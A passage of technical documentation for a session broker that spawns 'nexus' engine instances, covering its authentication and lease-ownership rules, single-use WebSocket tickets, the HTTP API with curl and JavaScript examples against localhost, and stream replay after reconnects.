> - **Do not point it at a network you share with anything else.** A `10.0.0.0/8`
>   that also holds other workloads means any of them can impersonate any broker
>   user. Prefer the proxy's `/32` (or `/128`).
> - **Bind the broker where only the proxy can reach it**, so the CIDR check is a
>   second line of defence rather than the only one.
> - If some callers arrive directly, **chain** a token validator after this one —
>   do not widen the CIDR to accommodate them.

```yaml
auth:
  validators:
    - type: proxy_headers
      trusted_proxy_cidrs: ["10.4.0.0/16"]   # required; an empty list fails the boot
      principal_header: X-Forwarded-User     # required; no default is right for everyone
      tenant_header: X-Auth-Request-Org
      scopes_header: X-Forwarded-Groups
    - type: jwks                             # direct callers still need a real token
      issuer: "https://id.example.com/"
      jwks_url: "https://id.example.com/.well-known/jwks.json"
      audience: "nexus-broker"
      principal_claim: sub
```

### Who may touch a lease

Every lease records the principal that claimed it. Authorization is that
ownership, plus one read-only admin scope — there are no roles and no policy
engine.

- **`POST /release/{lease_id}`, `WS /lease/{lease_id}` and
  `POST /ticket/{lease_id}`** require the caller's principal `ID` to equal the
  owner's. It is checked *before* anything happens: a refused release sends no
  shutdown frame and frees no slot, and a refused connect never reaches `101`.
- **A lease that is not yours answers exactly like a lease that never existed** —
  `404 {"error":"unknown lease"}`, byte for byte — so live lease ids cannot be
  enumerated by differencing responses.
- **`GET /leases` is filtered, not refused.** A non-operator sees only its own
  leases, and the capacity aggregates are **omitted rather than zeroed** (treat a
  missing `max_concurrent` as "not disclosed", never as `0`).
- **`auth.admin_scope`** (default `nexus.broker.admin`) unlocks the whole-registry
  view of `GET /leases`. It grants **visibility only — there is no admin bypass on
  release or connect**, so a leaked operator credential cannot tear down or hijack
  another principal's session. Set it to `""` to mean nobody is an operator.
- The broker's **own** teardown paths — the `idle_timeout` sweeper and crash
  detection — act with no principal at all and bypass ownership entirely.

With no `auth:` block, the caller and every lease owner are the same anonymous
identity, so nothing is refused and nothing is filtered.

### Connecting: the ticket flow

Browser JavaScript **cannot** set headers on a WebSocket handshake, so the bearer
token a claim was made with can never reach `WS /lease/{lease_id}` from a browser.
A **ticket** is the one credential the broker itself mints. End to end:

1. **Claim with your credential.** `POST /claim` returns `ws_url` **and**
   `ticket` — the `ticket` key is present only when the broker is configured with
   an `auth:` block.
2. **Connect with it**: `ws_url + "?ticket=" + ticket`.
3. **It is single-use and lives 30 seconds**, and the TTL is a constant rather
   than a config key: the value travels in a URL, so it lands in proxy access logs
   and browser history, and the tight window plus single use are the whole
   mitigation for that.
4. **Reconnecting needs a fresh one.** `POST /ticket/{lease_id}`, authenticated
   with the credential the lease was claimed with, mints a replacement. Do *not*
   re-claim: that spawns a new instance and abandons the live session. Send the
   fresh ticket **together with `?from_seq=`** so the broker also replays what
   the socket missed — the full recipe is [below](#reconnecting-and-resuming-a-stream).
5. **Non-browser clients can skip tickets entirely** and send
   `Authorization: Bearer <token>` on the handshake instead — the same token the
   lease was claimed with.

#### Reconnecting and resuming a stream

A dropped socket is not a lost session: the lease, the instance and the
[replay buffer](#frame-sequencing-and-the-replay-buffer) all survive it. The
whole reconnect, end to end:

1. **Remember the last `seq` you received.** Every client-bound frame carries
   one. Keep the highest.
2. **Do not re-claim.** `POST /claim` spawns a *new* instance and abandons the
   live session. The lease id you already hold is still the right one.
3. **Mint a fresh ticket** with `POST /ticket/{lease_id}`, authenticated with the
   credential the lease was claimed with — the original ticket burned on the
   first connect and lives only 30 seconds anyway. A client that can set headers
   can skip this and send `Authorization: Bearer <token>` instead.
4. **Reconnect with both parameters**:
   `ws_url + "?ticket=" + encodeURIComponent(ticket) + "&from_seq=" + lastSeq`.
   They compose freely and in any order; `?from_seq=` is not a credential and
   changes nothing about how the ticket is judged.
5. **Handle the two possible openings.** Either the buffer covered you — the
   frames you missed arrive first, in order, followed by the live stream — or it
   did not, and the socket opens with a **`stream-gap` frame** naming what is
   gone. **A gap is a normal outcome, not an error**: it is what a long
   disconnection or a chatty agent produces against a bounded buffer, and a
   client that does not handle it is a client that will render a hole as if it
   were continuous prose. See
   [when the buffer cannot cover you](#when-the-buffer-cannot-cover-you).
6. **Do not wait for the old socket to die first.** A reconnect **displaces**
   whatever connection the lease still has — including a half-open one the broker
   has not noticed yet — and closes it with code `4501`. That is the supported
   path, not a race you have to avoid; what you must not do is keep both sockets
   open. See
   [one client per lease](#one-client-per-lease-the-newest-connection-wins).

```js
// lastSeq is tracked by the message handler: ws.onmessage = e => {
//   const f = JSON.parse(e.data); if (f.seq) lastSeq = f.seq; ... }
const { ticket } = await (await fetch(
  `http://localhost:8080/ticket/${lease_id}`, { method: "POST", headers: auth })).json();

const params = new URLSearchParams({ from_seq: String(lastSeq) });
if (ticket) params.set("ticket", ticket);   // absent when the broker has no auth: block
const ws = new WebSocket(`${ws_url}?${params}`);
```

Omitting `?from_seq=` connects to the live stream only, exactly as a first
connect does — and so does a value the broker cannot parse. A malformed
`from_seq` is treated as **absent** rather than refused, so a bug in building
the URL costs you the replay and not the session.

A non-empty `?ticket=` **wins exclusively**: when both are presented the
`Authorization` header is not consulted at all, and a ticket failure is final
rather than falling back to the header. Send one credential, or mint a fresh
ticket. Every way a ticket can fail — unknown, expired, already redeemed, minted
for another lease — answers identically with `401 {"error":"credential
rejected"}`.

Tickets are in-memory only, so they do not survive a broker restart, and every
ticket for a lease is destroyed the moment the lease goes away.

### The instance dial-back secret

The dial-back is **not** covered by the `auth:` block, and never was in the sense
that matters: `auth:` says how *clients* are verified, while `WS /instance` is
where a *process the broker started* proves it is that process.

An instance's `register` frame must carry a known `lease_id` **and** the
per-spawn secret the broker injected into its environment at exec. This is
**unconditional** — with an `auth:` block or without one, on a freshly claimed
lease or one [restored after a restart](#what-a-restart-actually-does). The
secret is never logged, never returned by `GET /leases`, and never passed in
argv. The instance side needs no configuration — the
[`nexus.io.broker`](../plugins/io/broker.md) plugin reads
`NEXUS_BROKER_SPAWN_SECRET` from the environment the broker set.

**Why it cannot be optional.** The only other thing the dial-back could
authenticate with is the lease id, and a lease id is not a secret: it travels in
the `ws_url` handed to every client, in client requests, and in logs. Anything
that observed one could dial `/instance`, register as that lease's instance the
moment the real socket dropped, and be handed the client's session. Making the
check conditional on an unrelated block meant the documented default deployment
ran with that hole open.

> **Breaking change.** Enforcement used to be gated on having an `auth:` block,
> so a broker without one admitted any register frame naming a live lease —
> including one carrying no secret at all. It no longer does. A `nexus` build that
> predates the spawn-secret protocol now fails to register on **every** broker,
> and removing the `auth:` block is no longer a way to make it work. The fix is to
> upgrade the binary the [registry entry](#serving-several-nexus-variants-the-binary-registry)
> points at. The check is per **spawn**, so one stale variant fails while the rest
> of the registry keeps working.

**Every refusal looks the same on the wire.** An unknown lease, an absent secret,
a wrong secret and a version-skewed frame all close with the same
`unknown lease` policy-violation close. That is deliberate: a dialer that could
tell "no such lease" from "that lease exists and you got its secret wrong" could
enumerate live lease ids by differencing the two. **The log is the only place the
causes are distinguished**, and each one names its own fix:

| Log record | What happened | Fix |
|---|---|---|
| `…: its register frame declares a broker frame schema version this broker does not speak` | The instance binary and the broker binary are different builds of the frame protocol. | Upgrade whichever is older so both speak the same version. |
| `…: its register frame carried NO spawn secret` | The instance binary predates the spawn-secret protocol. | Upgrade the binary that registry entry points at. |
| `…: its register frame carried the WRONG spawn secret` | This broker did not spawn the process that dialed back. | Investigate: something is impersonating an instance, or a stale instance is dialing a broker that was restarted without its `state_dir`. |
| `rejecting instance registration` (no specific cause) | The lease id is unknown, or the lease already has an instance attached. | Usually a late reconnect from a released lease; harmless. |

All four are `WARN`, and none of them ever contains a secret value. The
diagnostics matter because the *symptom* is identical and misleading: the claim
sits there until it fails with `504 instance did not become ready in time` while
the child process is alive and connecting fine.

A `504` with **none** of those records is the other shape of the same symptom:
the instance is simply still booting. Engine construction runs every plugin's
`Init` and `Ready`, so a config that pulls a long model list, warms a vector
store or dials several MCP servers can legitimately outlast the 30s default.
Raise [`ready_timeout`](../configuration/reference.md#session-broker-nexus-broker)
rather than trimming the profile; it must be positive, and a non-positive or
unparseable value fails the boot naming the key.

## HTTP API

All control-plane calls are plain HTTP/JSON. Whether they need a credential
depends on the [`auth:` block](#authentication): with one configured, every route
below requires one (`GET /healthz` does not); with it absent, none of them do.

### `POST /claim` — claim an instance

Body:

```jsonc
{
  "config": "engine:\n  name: example\n",  // required: full nexus config (YAML text)
  "session_id": "prior-session-id",         // optional: resume a persisted session
  "binary": "vision"                        // optional: which `binaries:` entry to spawn
}
```

Success (`200`):

```jsonc
{
  "lease_id": "…",                          // handle for this instance
  "ws_url": "ws://host:port/lease/<lease>",  // client WebSocket endpoint
  "session_id": "…",                         // engine session id (see new-vs-resume below)
  "ticket": "…"                              // single-use, 30s WebSocket credential;
                                             // present only when `auth:` is configured
}
```

```bash
curl -s -X POST http://localhost:8080/claim \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <token>' \
  -d '{"config":"engine:\n  name: example\n"}'
```

The `Authorization` header is required when the broker is configured with an
[`auth:` block](#authentication) and ignored when it is not. The principal it
resolves to becomes the lease's **owner**, and only that principal can release,
connect to, or mint a ticket for the lease.

Error responses:

| Condition | Status | Body |
|-----------|--------|------|
| Missing/empty `config` | `400` | `{"error":"claim requires a non-empty config"}` |
| Unknown `binary` name | `400` | `{"error":"unknown binary \"…\"; this broker spawns: …"}` |
| Resume whose `binary` differs from the one recorded for the session | `409` | `{"error":"session \"…\" was created by binary \"…\" but this claim requests \"…\"; …"}` |
| Resume whose recorded binary is no longer in `binaries:` | `409` | `{"error":"session \"…\" was created by binary \"…\", which this broker no longer offers; …"}` |
| Over capacity, queue wait elapsed | `503` | `{"error":"capacity wait timed out"}` |
| At capacity, queueing disabled (`queue_wait_timeout <= 0`) | `503` | `{"error":"no capacity"}` |
| At capacity and the wait queue is already `max_queue_depth` deep | `503` | `{"error":"capacity queue full"}` |
| This principal already holds `max_leases_per_principal` live leases | `429` | `{"error":"lease limit reached for this principal"}` |
| This principal already has `max_queued_per_principal` claims queued | `429` | `{"error":"queued claim limit reached for this principal"}` |
| Instance exited before ready (e.g. resume of a missing/invalid session) | `502` | `{"error":"instance exited before signalling ready"}` |
| Instance did not become ready within the boot window | `504` | `{"error":"instance did not become ready in time"}` |

### Choosing a binary

`binary` names an entry of the broker's
[binary registry](#serving-several-nexus-variants-the-binary-registry):

```bash
# spawn the "vision" variant
curl -s -X POST http://localhost:8080/claim \
  -H 'Content-Type: application/json' \
  -d '{"config":"engine:\n  name: example\n","binary":"vision"}'

# omit `binary` and the claim spawns the reserved `nexus` entry
curl -s -X POST http://localhost:8080/claim \
  -H 'Content-Type: application/json' \
  -d '{"config":"engine:\n  name: example\n"}'
```

**Omitting `binary` means `nexus`**, the entry every broker is guaranteed to
have, so a client written before the registry existed keeps getting exactly what
it got before. The field is trimmed of surrounding whitespace, the same way entry
names are trimmed at load, so the two always agree. **On a resume this changes**:
omitting `binary` alongside a `session_id` means the entry that created the
session, not `nexus` — see
[A resume re-uses the binary that created the session](#a-resume-re-uses-the-binary-that-created-the-session).

An unknown name returns `400` naming the rejected value and listing the entries
this broker actually has — never a silent fallback to `nexus`. The check runs
before the claim allocates anything, so a typo consumes no lease, no capacity
slot, no temp config file, and spawns no process. To pick a name that is
certainly valid on *this* broker, read
[`GET /binaries`](#get-binaries--list-the-spawnable-binaries) first.

The entry's `args` are appended after the broker's own `-config` / `-recall`
arguments, and its `env` is layered under the broker-owned `NEXUS_BROKER_*`
variables — an entry can extend a spawn but never redirect it at another broker
or supply its own spawn secret. The spawned instance carries **only** the
always-pass set, whatever `inherit_env` declares, the entry's `env` and the
`NEXUS_BROKER_*` trio — see
[What environment an instance is given](#what-environment-an-instance-is-given).

### New vs. resume

- **New session** — omit `session_id`. The engine generates a fresh session id
  and the instance reports it back; the broker returns it in the response.
  **Capture that id** if you want to resume the session later.
- **Resume** — set `session_id` to a previously returned id. The broker spawns
  the instance with `-recall <id>`, so the engine reloads that session from
  `~/.nexus/sessions/<id>/` and replays its history. The response echoes the
  requested id.

Resuming a session id that does not exist on disk makes the engine fail to boot;
the instance never signals ready and the claim returns **`502`** rather than
silently starting a new session.

#### A resume re-uses the binary that created the session

A session directory is engine state written by **one particular build**, and
replaying it under a different variant does not fail loudly: the engine boots,
the transcript loads, and the session simply behaves as though capabilities it
once had have vanished. The claim is the last point at which that mistake is
still attributable, so the broker records which
[`binaries:` entry](#serving-several-nexus-variants-the-binary-registry) ran each
session — the entry **name**, never a path — and reconciles a resume against it.

Recording happens only when [`state_dir`](#surviving-a-restart-set-state_dir) is
configured, in two places:

- the **lease journal** stamps the entry name on the lease record, so
  `leases.jsonl` says which variant a live lease is running;
- the **session → binary index**, `session-binaries.jsonl`, keeps the pairing
  after the lease is gone. This is the one a resume actually consults, because a
  resume always arrives *after* the original lease was released and the journal is
  compacted down to live leases. The broker checks live leases first and falls
  back to the index.

On a claim that carries a `session_id`:

| You send | Recorded binding | What happens |
|---|---|---|
| no `binary` | `vision` | Spawns **`vision`** — the recorded entry is inherited with its `path`, its `args` **and** its `env`. Not the reserved `nexus`. |
| `"binary": "vision"` | `vision` | Proceeds normally. |
| `"binary": "nexus"` | `vision` | **`409`**, naming **both** the recorded entry and the one you asked for. |
| anything | *none recorded* | **Falls through** — spawns what you asked for, or `nexus` if you asked for nothing. **No error.** |
| no `binary` | `nocturne`, no longer in `binaries:` | **`409`** naming the missing entry, so it can be restored. Deliberately *not* a silent fallback to `nexus`. |

A `binary` that is empty or only whitespace counts as **omitted**. An *unknown*
name is still a `400`, not a `409`, even on a bound session — a typo is reported
as a typo, and only the `400` lists the entries this broker actually has. Every
rejection happens **before anything is allocated**: no lease, no capacity slot, no
place in the queue, no temp config file, and no process.

The exact error strings and the reasoning behind `409` over `400`/`500` are in
[Resume inherits the recorded binary](../configuration/reference.md#resume-inherits-the-recorded-binary).

#### The 409 is best-effort, not an invariant

**Do not build a client that relies on the mismatch check catching every
mistake.** An unrecorded session is *no opinion, proceed* — never a mismatch — so
a resume runs completely unchecked whenever the binding is missing. Concretely,
nothing is checked when:

- **the broker has no `state_dir`.** Nothing is recorded durably, so once the
  original lease is gone so is the pairing — which is every resume, since a resume
  by definition follows a release.
- **the binding was evicted.** The index holds at most **4096** pairings and drops
  the **oldest first**, so a session resumed after a lot of other traffic can find
  its binding gone.
- **the session predates the feature**, or was created against a *different*
  broker — no broker reads another's index.

In all three the claim proceeds silently under whatever binary it asked for. The
check is a safety net over the common mistake, not a guarantee about what a
session directory is replayed under.

**The recommended client pattern is therefore: capture `session_id` *and* the
`binary` you claimed with, and send both back on resume.** That way the correct
variant is selected by your own request rather than by a broker-side record that
may not exist:

```bash
# 1. claim, remembering BOTH values
claim=$(curl -s -X POST http://localhost:8080/claim \
  -H 'Content-Type: application/json' \
  -d '{"config":"engine:\n  name: example\n","binary":"vision"}')
session_id=$(printf '%s' "$claim" | jq -r .session_id)
binary=vision                      # persist this next to the session id

# 2. resume, restating the binary you recorded
curl -s -X POST http://localhost:8080/claim \
  -H 'Content-Type: application/json' \
  -d "{\"config\":\"engine:\n  name: example\n\",\"session_id\":\"$session_id\",\"binary\":\"$binary\"}"
```

Restating a matching `binary` costs nothing when the broker also has the binding
(the claim simply proceeds), and it is the only thing that keeps the resume
correct when the broker does not.

### `POST /release/{lease_id}` — release an instance

Gracefully tears a live instance down: the broker sends a `shutdown` frame, the
instance's `nexus.io.broker` plugin emits `io.session.end`, and the engine
performs a clean `Stop` that flushes and **persists the session before exit**.
The session directory under `~/.nexus/sessions/<id>/` is left intact and remains
resumable via `-recall`.

The frame is only the first step, because it travels over the dial-back socket
and teardown has to be correct when that socket is gone. If the process has not
exited within `release_grace`, the broker escalates:

| Step | What | Why |
|---|---|---|
| 1 | `shutdown` frame over the instance WS | The instance shuts its own engine down and reports back. Requires a live socket. |
| 2 | `SIGTERM` to the instance's **process group**, at the `release_grace` boundary | The engine treats `SIGTERM` as a clean shutdown, so this still flushes and persists. It needs nothing from the instance — a wedged instance, or one mid reconnect-backoff, never saw step 1. |
| 3 | `SIGKILL` to the same group, a fixed **2s** later | Orphan prevention. Not configurable: `release_grace` is the shutdown budget and has already elapsed. |

Both signals target the **process group**, not just the instance process. Every
instance is made the leader of its own process group at spawn, so everything it
started — shell-tool commands, MCP stdio servers, code interpreters — is torn
down with it rather than surviving, re-parented to init, holding the session's
files and the operator's API budget with nothing tracking it.

The same escalation is what reaps an **adopted** instance after a restart (it has
no socket by construction, so it starts at step 2), which is why the two paths
share one `SIGTERM`→`SIGKILL` window.

```bash
curl -s -X POST http://localhost:8080/release/lease-abc123
# {"status":"released","lease_id":"lease-abc123"}
```

| Outcome | Status | Body |
|---------|--------|------|
| Released (graceful or killed) | `200` | `{"status":"released","lease_id":"…"}` |
| Unknown / already-released lease | `404` | `{"error":"unknown lease"}` |
| Missing lease id in path | `400` | `{"error":"release requires a lease id"}` |

Release is **idempotent**: releasing an already-gone lease returns `404` rather
than erroring, and concurrent releases of the same lease collapse to one
teardown.

### `POST /ticket/{lease_id}` — mint a fresh WebSocket ticket

Only relevant when the broker is configured with an `auth:` block. A browser
cannot put an `Authorization` header on a WebSocket handshake, so a claim hands
back a **single-use, 30-second** `ticket` bound to that lease and to the claiming
principal. Because the window is deliberately tight, a reconnect needs a fresh
one — that is what this route is for; re-claiming would spawn a *new* instance and
abandon the live session.

```bash
curl -s -X POST http://localhost:8080/ticket/lease-abc123 \
  -H 'Authorization: Bearer <the token the lease was claimed with>'
# {"lease_id":"lease-abc123","ticket":"…"}
```

| Outcome | Status | Body |
|---------|--------|------|
| Ticket issued | `200` | `{"lease_id":"…","ticket":"…"}` |
| Unknown, already-released, **or** another principal's lease | `404` | `{"error":"unknown lease"}` (identical in all three cases, so live lease ids cannot be enumerated) |
| Missing lease id in path | `400` | `{"error":"ticket requires a lease id"}` |

Tickets are in-memory only — they do **not** survive a broker restart — and every
ticket for a lease is destroyed the moment the lease goes away, whether by
`POST /release`, idle reaping, or a crash. With no `auth:` block the route is
inert: it answers `200` with the `ticket` key **omitted**, and the lease socket
keeps accepting a connection with no ticket at all. Full detail, including why the
TTL is not configurable, is in the
[configuration reference](../configuration/reference.md#post-ticketlease_id-http-api-not-yaml).

### `GET /leases` — list live instances

A read-only introspection surface, sorted by `created_at` then `lease_id`. It
performs no mutation.

**What comes back depends on who is asking.** A caller holding
[`auth.admin_scope`](#who-may-touch-a-lease) — and every caller when auth is
disabled — gets the **operator** shape: every live lease plus the capacity and
queue aggregates. Any other authenticated caller gets only its own leases, with
the aggregates **omitted**.

```bash
curl -s http://localhost:8080/leases -H 'Authorization: Bearer <token>'
```

Operator shape:

```jsonc
{
  "max_concurrent": 8,     // configured cap (0 = unlimited)
  "slots_in_use": 2,       // live instances currently holding a slot
  "queue_depth": 0,        // claims parked in the FIFO capacity wait queue
  "leases": [
    {
      "lease_id": "lease-abc123",
      "session_id": "…",
      "pid": 41234,
      "state": "active",           // "spawning" | "active" | "draining"
      "reason": "",                 // teardown reason once draining (e.g. "manual release", "idle")
      "last_activity": "2026-06-25T12:00:00Z",
      "created_at": "2026-06-25T11:59:30Z"
    }
  ]
}
```

Caller-scoped shape — same lease objects, same ordering, **no aggregate keys at
all**:

```jsonc
{
  "leases": [
    {
      "lease_id": "lease-abc123",
      "session_id": "…",
      "pid": 41234,
      "state": "active",
      "last_activity": "2026-06-25T12:00:00Z",
      "created_at": "2026-06-25T11:59:30Z"
    }
  ]
}
```

The aggregates are **absent, not zeroed** — read a missing `max_concurrent`,
`slots_in_use` or `queue_depth` as "not disclosed to you", never as `0`. A caller
that owns no live lease gets `200` with `{"leases": []}`, never a `404`.

Lease states:

| State | Meaning |
|-------|---------|
| `spawning` | The lease exists but its instance has not yet dialed back and registered — the claim is still booting an engine. |
| `active` | The instance has registered; frames can flow. |
| `draining` | A teardown (manual release, idle, or crash) has latched; the lease is on its way out. |

### `GET /binaries` — list the spawnable binaries

A read-only listing of this broker's
[binary registry](#serving-several-nexus-variants-the-binary-registry), so a
client can build a picker — or check a name it has configured — from live broker
truth rather than from entries hardcoded against a broker that may not have them.
It performs no mutation and reads nothing from the request.

```bash
curl -s http://localhost:8080/binaries -H 'Authorization: Bearer <token>'
```

```jsonc
// 200 — entries sorted by name, ascending
{
  "binaries": [
    { "name": "archive", "label": "Nexus 0.9" },
    { "name": "nexus" },
    {
      "name": "vision",
      "label": "Nexus (vision)",
      "description": "Multimodal build with the image tools compiled in"
    }
  ]
}
```

- **`name`** is the registry key, and the exact string to send back as a claim's
  `binary`. Always present.
- **`label`** and **`description`** are the operator's presentational strings.
  They are **omitted, not empty**, when none was set — so a client can tell "the
  operator wrote nothing" from "the operator wrote an empty string" — and a
  consumer with no label falls back to `name`.
- **`binaries`** is always present and never `null`; the empty case is
  `{"binaries": []}`, so a client can iterate it unconditionally. In practice it
  always holds at least the reserved `nexus` entry, which every broker can spawn.
- Ordering is by `name`, ascending. It does not change between requests and does
  not differ between callers, so a picker built from it never reshuffles.
- The listing follows a
  [`SIGHUP` reload](#changing-config-without-a-restart-sighup): an entry an
  operator adds or removes appears or disappears here without a restart.

**The response is an object, not a bare array.** Decode it into a struct with a
`binaries` field rather than into a list: the envelope leaves room for a
broker-wide fact later — a default-binary hint, a schema version — to arrive as a
sibling key that a client ignoring unknown keys never notices. Per-field types are
in the
[`GET /binaries` reference](../configuration/reference.md#get-binaries-http-api-not-yaml),
which is authoritative.

**`path`, `args` and `env` are deliberately not returned**, nor is the absolute
path the broker resolved for the entry at boot. They are broker-host detail —
build locations, deployment flags, per-variant environment — that a claiming
client has no use for and every reason not to learn. A client picks a *name*; what
that name runs stays the broker's business.

**Authentication is exactly `POST /claim`'s**, because it is exactly the same
middleware. With an [`auth:` block](#authentication) configured, a missing
credential is refused `401 authentication required` and an invalid one `401
credential rejected`; a valid one gets the list. **With no `auth:` block the route
serves an unauthenticated caller**, just as `/claim` does — a supported
deployment, not a degraded one. A caller that may not claim has no business
enumerating what it cannot spawn.

**The listing is not filtered per principal.** Every authenticated caller sees
**every** entry and may claim any of them. There is no per-entry visibility rule
and no per-entry authorization anywhere in the broker.

That is a **known gap, deferred by decision rather than overlooked**: an entry
name is not a secret (naming a wrong one is already a `400` from `POST /claim`
that lists the alternatives), and a filter would need a per-entry authorization
model that no config key describes today — building one here would put the policy
in the listing handler instead of next to the model that should own it. Until such
a model exists, the way to make a variant reachable by only some callers is a
**separate broker** with its own `binaries:` block and its own `auth:` chain. See
also [What the registry deliberately does not do](#what-the-registry-deliberately-does-not-do)
and the [v1 caveats](#v1-caveats).

#### Discover, then claim

The intended client flow is two calls: read the registry, pick a `name` out of it,
then send that name back as `binary` alongside the config to run.

```bash
broker=http://localhost:8080
auth='Authorization: Bearer <token>'    # drop the -H below when the broker has no `auth:` block

# 1. discover what this broker offers (label falls back to name)
curl -s "$broker/binaries" -H "$auth" \
  | jq -r '.binaries[] | "\(.name)\t\(.label // .name)"'
# archive   Nexus 0.9
# nexus     nexus
# vision    Nexus (vision)

# 2. pick a name from that listing
binary=vision

# 3. claim it, passing the engine config to run
claim=$(curl -s -X POST "$broker/claim" \
  -H 'Content-Type: application/json' -H "$auth" \
  -d "{\"config\":\"engine:\n  name: example\n\",\"binary\":\"$binary\"}")

lease_id=$(printf '%s' "$claim" | jq -r .lease_id)
ws_url=$(printf '%s' "$claim" | jq -r .ws_url)
session_id=$(printf '%s' "$claim" | jq -r .session_id)
```

Then open `ws_url` as in [Connecting over WebSocket](#connecting-over-websocket).
Persist `session_id` **and** `$binary` together if you mean to resume later: a
resume should restate the binary it was claimed with, because the broker's own
record of that pairing is best-effort — see
[The 409 is best-effort, not an invariant](#the-409-is-best-effort-not-an-invariant).

Prefer discovering per run over caching the names. The registry is read **once at
broker startup** and can only change across a restart, so a client holding names
from an earlier session may be holding entries this broker no longer offers —
which surfaces as a `400` on the claim, after the user has already chosen.

### Connecting over WebSocket

After a successful claim, open the returned `ws_url` and exchange IO frames. A
minimal browser sketch, carrying the [ticket](#connecting-the-ticket-flow) the
claim returned:

```javascript
const auth = { Authorization: "Bearer <token>" };   // omit when auth is disabled

const { lease_id, ws_url, ticket } = await (await fetch("http://localhost:8080/claim", {
  method: "POST",
  headers: { "Content-Type": "application/json", ...auth },
  body: JSON.stringify({ config: "engine:\n  name: example\n" }),
})).json();

// `ticket` is present only when the broker is configured with an `auth:` block.
const url = ticket ? `${ws_url}?ticket=${encodeURIComponent(ticket)}` : ws_url;

const ws = new WebSocket(url);
ws.onmessage = (e) => console.log("frame:", e.data);
ws.onopen = () => {
  // send a user input message into the instance
  ws.send(JSON.stringify({ type: "input", content: "hello" }));
};

// reconnecting later? the ticket is single-use and 30s-lived — mint a fresh one
// rather than re-claiming, which would spawn a NEW instance — and send the
// highest seq you received as ?from_seq= so the broker replays what you missed.
// const { ticket: next } = await (await fetch(
//   `http://localhost:8080/ticket/${lease_id}`, { method: "POST", headers: auth })).json();
// new WebSocket(`${ws_url}?ticket=${encodeURIComponent(next)}&from_seq=${lastSeq}`);
// a "stream-gap" frame on the new socket means the buffer could not cover you:
// it names the missing range, and handling it is the client's job.

// later: release the instance (the session persists on disk)
await fetch(`http://localhost:8080/release/${lease_id}`, { method: "POST", headers: auth });
```

A client that can set request headers — Go, a CLI, anything that is not a browser
— may skip tickets and send `Authorization: Bearer <token>` on the handshake
instead.

The IO message shapes carried inside broker frames (`output`, `stream.delta`,
`input`, `approval.response`, …) are documented on the
[`nexus.io.broker` plugin page](../plugins/io/broker.md#how-it-works).

### Frame sequencing and the replay buffer

Every frame the broker sends a client carries a **sequence number**: `seq`, a
per-lease counter that starts at 1 and increments by exactly one for every frame,
whatever its signal.

```json
{"version":1,"lease_id":"a1b2…","signal":"io","seq":42,"payload":{"type":"stream.delta","content":"…"}}
```

It exists because the gateway has two places where a client-bound frame can fail
to reach its socket — **no client is attached**, and an attached client whose
send queue is full — and before sequencing both of them logged and continued.
A client had no way to tell that it had lost anything, which for a streaming agent
is the worst shape of failure: it silently corrupts what the user believes the
agent said. A gap in `seq` makes that loss visible.

**Track the sequence and treat a jump as an error.** A client that sees `seq`
advance by more than one has missed output and should say so rather than render
the remainder as if it were complete.

Alongside the sequence, each lease keeps a **replay buffer**: the encoded bytes
of the frames it has already sent, bounded by
[`client_replay_buffer_bytes`](../configuration/reference.md#session-broker-nexus-broker)
(1 MiB by default) and evicted **oldest first**. Both loss paths retain the frame
rather than discarding it, so a missed range is not only detectable but
recoverable.

Four properties are worth stating plainly:

- **Only client-bound frames are sequenced.** Frames flowing client → instance
  carry no `seq` and are not buffered. The broker assigns the number, so an
  instance needs no protocol awareness and nothing on the dial-back side changed.
- **The bound is in bytes, not frames.** A client-bound payload runs from a
  few-byte token delta to a hundred-kilobyte tool result, so a frame count would
  say nothing about how much memory a lease can pin. Worst-case retention across
  the whole broker is `client_replay_buffer_bytes` × `max_concurrent` — 8 MiB at
  both defaults. Set `max_concurrent: 0` (unlimited) and that product is
  unbounded too, so size the two together.
- **The buffer is in-memory and dies with the lease.** Nothing about it is
  journaled: `state_dir` does not persist it, releasing a lease frees it
  immediately, and **a broker restart does not preserve it**. A lease restored
  from the journal after a restart starts a fresh stream — its sequence begins
  again at 1 with an empty buffer, which is itself the signal to a reconnecting
  client that its stream did not survive.
- **`seq` is additive on the wire.** It is omitted when zero, so a peer built
  against an older broker decodes a sequenced frame cleanly and ignores the key.
  Adding it needed no `brokerframe` version bump.

Setting `client_replay_buffer_bytes: 0` disables retention while leaving
sequencing intact — loss stays visible to the client, but the broker keeps
nothing to replay with.

#### Resuming from the buffer

The buffer is reached with **`?from_seq=<n>`** on the client socket:

```
ws://localhost:8080/lease/lease-abc123?ticket=<value>&from_seq=41
```

`n` is the highest `seq` the client received. The broker replays every retained
frame **after** it, oldest first, and only then continues with the live stream —
replayed frames always precede live ones, whatever else is in flight when the
socket opens. `?from_seq=0` means "I have seen nothing": it replays everything
the buffer still holds, which is not the same as omitting the parameter (that
asks for the live stream only).

It is a query parameter for the same reason [`?ticket=`](#connecting-the-ticket-flow)
is one — a browser cannot set headers on a WebSocket handshake, and the first
frame a client sends is already routed straight through to the instance, so
there is no control frame to carry it in. The two parameters compose and
`?from_seq=` is **not a credential**: it never widens what a caller may connect
to, and ownership is checked exactly as it is without it.

The replay is not capped by the connection's 256-frame send queue — it is
written ahead of it — so a full megabyte of buffered token deltas replays
intact.

#### When the buffer cannot cover you

If the frames right after `from_seq` have already been evicted, the socket opens
with a **`stream-gap` frame** before anything else:

```json
{"version":1,"lease_id":"a1b2…","signal":"stream-gap",
 "payload":{"reason":"evicted","requested_from_seq":41,"missing_from_seq":42,"missing_through_seq":118}}
```

- `missing_from_seq` … `missing_through_seq` are the **inclusive** bounds of what
  the broker can no longer supply. The frames it *can* still supply follow
  immediately, then the live stream.
- `reason` is `evicted` — the frames aged out of a bounded buffer — or
  `restarted`, which means `from_seq` is **ahead** of this lease's stream. That
  is the [restart](#what-a-restart-actually-does) case: a lease restored from the
  journal renumbers from 1, so the client's position belongs to a stream that no
  longer exists. Its old numbering is void; the broker replays everything it now
  holds and the missing-range fields are omitted, because none can be named.
- The gap frame carries **no `seq`**. It describes one *connection*, not the
  lease's frame stream, so numbering it would make the stream's sequence depend
  on how often a client dropped.

**Treat a gap as a normal outcome and handle it.** It is what a disconnection
longer than the buffer produces, and the client is the only party that can decide
what to do: re-render from its own transcript, tell the user output is missing,
or start a fresh view. Ignoring it puts you back where the sequence was
introduced to stop you being — rendering a hole as continuous output.

Adding `stream-gap` needed no `brokerframe` version bump, for the same reason
`seq` did not: the broker only ever emits it to a client that asked for a resume,
so nothing built against an older broker can be handed a signal it cannot decode.

#### One client per lease: the newest connection wins

A lease carries exactly **one** client connection, and opening a second one does
not multiplex the stream: it **displaces** the first. The older socket is closed
